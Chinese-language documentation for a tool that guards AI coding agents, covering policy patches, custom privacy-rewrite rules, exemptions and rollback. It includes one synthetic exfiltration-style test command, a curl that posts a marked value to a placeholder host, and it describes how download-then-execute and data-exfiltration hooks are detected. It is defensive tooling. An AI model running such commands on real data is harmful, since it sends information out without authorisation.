# 策略补丁、自定义规则与隐私词改写

[中文首页](../README.md) · [English](policy-customization.en.md) · [提案接口契约](policy-proposal-contract.md) · [策略历史与恢复](policy-runtime.md)

日常规则调整优先制作 `nmzp-policy-proposal/1` JSON 补丁，由维护者验证后在线发布到 CT。这个流程不需要每次发布 GitHub 版本，也不需要重启核心。首次使用须先部署支持提案接口的核心版本；设备依靠原有策略拉取和心跳获得新版本。

## 哪些修改可以热更新

现有引擎支持的规则覆盖、自定义匹配、隐私词阻断或改写、非受保护规则豁免，以及明确删除已有配置，可以使用数据补丁。未涉及的现有配置保留。`mode`、`stopped`、上传策略、程序代码和新字段不属于提案内容。

新增内置检测逻辑、修改正则解释方式、Hook 协议、适配器、数据库结构或身份校验，需要更新程序并重新测试；是否必须更新程序取决于改动内容，不取决于版本号是否叫“大版本”。未来核心继续支持 `/1` 时应保持其语义；协议或规则目录不兼容时拒绝旧补丁，不能默默解释成另一种行为。

## 制作与发布流程

1. 记录生成补丁所依据的 GitHub commit、变更目的、合成正反例和预期影响。不要把真实日志、隐私词清单、完整策略或管理凭证交给外部 Bot；用无敏感的合成案例表达需求。
2. 管理员从实际 CT 的 `GET /api/v1/policy/proposals/capabilities` 读取 `policyVersion`、`rulesHash`、`schema`，将前两项原样写入补丁的 `basePolicyVersion`、`baseRulesHash`。GitHub 的版本不能代替 CT 当前状态。
3. 对同一份 JSON 调用 `POST /api/v1/policy/proposals/validate`。检查新增、删除及状态变更，验证会命中的合成案例、应放行案例和作用域之外的案例。预检不写入，不意味着所有后续提交一定成功。
4. 维护者批准具体差异后，对同一份 JSON 调用 `POST /api/v1/policy/proposals/apply`。鉴权、证书校验和管理口令保管沿用现有管理员通道。收到成功及递增版本后，核对当前策略；网络超时或 `409` 时先检查是否已提交，不能修改基线后盲目重试。
5. 检查目标设备的心跳与 `lastPolicyVersion`，再用合成工具输入验证预期效果。CT 已保存、设备已获取、宿主已执行拒绝或改写分别记录；离线设备保持待同步或未知。

旧页面可导入未绑定目录摘要的传统建议，并由“全部先试运行”选项控制预览。含 `baseRulesHash` 的补丁在旧页面只允许预览，发布使用上述服务端接口；不要去掉绑定字段来绕过校验。只读 viewer 无发布权限。

## 自定义规则与隐私词示例

以下是合成草稿，发布前填入从 CT 取得的两个绑定字段。可运行样例在 [examples/privacy-proposal.json](../examples/privacy-proposal.json)。

```json
{
  "schema": "nmzp-policy-proposal/1",
  "customRules": [
    {
      "match": "SYNTHETIC_EMP-[0-9]{4}",
      "mode": "replace",
      "kind": "synthetic_employee",
      "scope": { "tools": ["Bash"], "fields": ["command"] },
      "dryRun": false
    }
  ],
  "rationale": "将工具参数中的合成员工标记改写为标签；保留不匹配内容"
}
```

`mode: "block"` 请求阻断，`mode: "replace"` 请求将命中内容改写为固定 `<标签>`；此提案格式不接受任意 `replaceWith`、`enabled`、规则 ID 或可执行脚本。新规则未写 `dryRun` 时默认试运行，显式 `dryRun: false` 则按当前全局模式参与执行，不会被接口强制改成试运行。原有规则页面保留“开 / 试运行 / 关”三态。全局观察、关闭或暂停状态不会因为发布补丁被自动改成执行。

隐私自定义规则沿用现有外发检测语义：只有引擎判定为外发的操作才触发上述阻断或参数改写。例如合成输入 `curl -d 'SYNTHETIC_EMP-1234' https://example.invalid/x` 应请求改写，而普通本地 `echo SYNTHETIC_EMP-1234` 不应因此变成改写；审计展示脱敏与实际参数改写是不同结果。改写仍须通过原有 Shell 安全校验：未加引号的 `<标签>` 会被解释为重定向，可能返回 `rewrite_would_break_shell` 阻断，不能为使样例通过而放宽此检查。验收只向评估接口提交合成输入，不执行这些命令。

`match` 长度为 2–80 字符，使用现有匹配器：正则按忽略大小写、全局匹配处理；部分危险表达式拒绝，无法编译的表达式可能按字面文本处理。字面点号等元字符应转义，JSON 内的反斜杠需要双写，例如 `"synthetic\\.internal"`。必须用合成案例确认实际匹配结果，不能只检查 JSON 可解析。自定义规则总数上限 64。

`scope.tools` 使用标准工具名，如 `Bash`、`Read`、`Write`、`Edit`、`WebFetch`、`MCP`；`scope.fields` 仅支持 `command`、`file_path`、`url`、`contents`。未设置作用域意味着使用既有全范围匹配语义。仅在命中与改写路径支持的输入字段上生效；不采集或修改聊天记录，不删除模型已有上下文，也不能撤回已发送的请求。Antigravity 的改写转为宿主询问，其他宿主能力见[适配器说明](agents.md)。

## 修改已有规则、豁免与回退

新接口拒绝默默跳过同一匹配串。修改已有自定义规则时，在同一补丁的 `remove.customRuleIds` 列出原 ID，再在 `customRules` 添加完整新项；修改豁免同理使用 `remove.exemptionIds` 与 `exemptions`。基线版本检查保证删除和新增以一个新版本提交。规则覆盖按规则 ID 或家族键合并；单条覆盖优先于家族，之后才是默认值，仅在执行模式使用。受保护的内置阻断规则不可降级或豁免。

豁免须限定规则、匹配内容和必要工具范围；未填过期时间时为 30 天，显式过期时间须晚于创建时间且不超过 365 天。只使用可信目录中存在且可豁免的规则，避免没有效果的未知目标。提案中的未知字段会明确拒绝。

发布前保留上一版的版本号与核对依据。SQLite 模式可从历史记录恢复旧内容，服务端按当前可信规则校验后生成新的递增版本；不回退版本号。默认 window 模式没有完整策略历史，应由管理员在本地受控保存必要的逆向补丁，按当时最新基线复核后发布。提交结果未知时先走恢复检查，不能普通重启或自动重试绕过。

补丁不是程序升级包，不包含敏感工具正文。对每次发布保留补丁文件摘要、审核结论、服务端返回版本和设备验证结果；历史缺失时明确记为未知。

## 中转、MCP 授权与 Hook 示例

[examples/relay-log-proposal.json](../examples/relay-log-proposal.json) 是可导入的未绑定草稿，按上述流程补齐实际 CT 的版本和规则摘要后，可经服务端预检、发布。它保留四项自定义观察规则的 `dryRun: true`，不更改 `env_file_read` 默认日志行为；这不是对所有补丁强制试运行。匹配中的域名和 IP 点号已按正则转义。

0.2.4 将 Claude settings 中单独的 `ANTHROPIC_BASE_URL` 配置记录为 `claude_settings_relay_write`（medium/log，无受保护家族），不因地址是否官方而阻断或询问。普通 MCP 授权，包括自动批准项目服务与指定服务白名单，均仅记日志；保留已有批准、关闭自动批准或清空白名单不会因键名被判投毒。明确的下载后执行、文件外传等危险 Hook/MCP 执行链仍由受保护的 `agent_hook_poison` 阻断；中转日志规则不能覆盖已检测的外传、自保护或密钥泄露阻断。合法安装器也可能具有下载后执行行为，因此放进自动 Hook 时会被此规则保守阻断。

普通格式化、测试、通知、可识别的纯文本打印不因含有 curl/wget 示例而被判执行。检测只解析有上限的命令与数据脚本子集，不执行脚本、不读取引用文件；未知语法、动态执行、复杂引用仍采用保守检测，不能承诺所有合法脚本均无误报。归档关联区分已识别的 tar 查看/解包与实际创建，真实创建加上传仍保留关联保护。

这些检测改变需要程序 0.2.4，单独导入旧 JSON 不能替代。Acorn 8.18.0 从原锁文件中的已安装依赖提升为显式运行依赖，发布包包含解析器和 MIT 许可，不在 CT 运行安装脚本。旧引擎下的历史改写若不能按原引擎重建，重试明确返回 `historical_policy_unavailable`，不以新引擎伪造旧结果；已有策略正文与版本不因升级自动改写。未升级的离线设备仍使用其原本地引擎，CT 更新不等于所有本机运行代码已更新。
